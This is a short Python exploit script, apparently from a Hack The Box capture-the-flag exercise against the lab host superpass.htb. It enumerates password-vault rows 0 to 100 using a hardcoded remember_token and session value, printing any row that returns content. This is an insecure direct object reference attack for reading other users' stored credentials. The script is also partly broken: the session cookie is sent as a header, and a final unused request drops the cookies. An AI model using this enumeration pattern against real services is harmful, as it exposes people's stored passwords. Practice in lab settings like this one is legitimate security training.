import requests
from bs4 import BeautifulSoup

url = 'http://superpass.htb/vault/row/{}'

for i in range(101):
    formatted = url.format(i)
    token = {'remember_token': '9|8f50cc62e035672203937ef350c45d6a6780afafd9114b725dfb34ffa10cd42e92e484635b44b3f13d76ce1f6af818f2501684844daf93217e66ec4af933165f'}
    session = {'session': '.eJwljsGKwzAMRH_F6FwWRYpiJ1-x96UU2ZKbQHa7xOmp9N_XsHMZhhmG94Jb3bWt3mD5ekE4u8G3t6Z3hwt87q7Nw_64h-0nnI-gpfQynOvWwm_ffMD1fb30k8PbCst5PL2nzWABKonjmDDPPowk2eeMQomxOuocPVXhnBF1KlajZhNmq9UMbRJ0RfSZuBTBLnEp0ZRToSmnyCOxKBNJNWZlNKpEQy5ek4xZUsSh49-ezY9_mhnef_MgRhw.ZASKMA.w6U__4YcRwL2RGiPaAiuFbNDN_o'}
    response = requests.get(formatted, cookies=token, headers=session)
    soup = BeautifulSoup(response.text, 'html.parser')
    if len(soup.get_text(strip=True)) > 0:
        print(f"Content found in URL: {formatted}")
        result = requests.get(formatted)
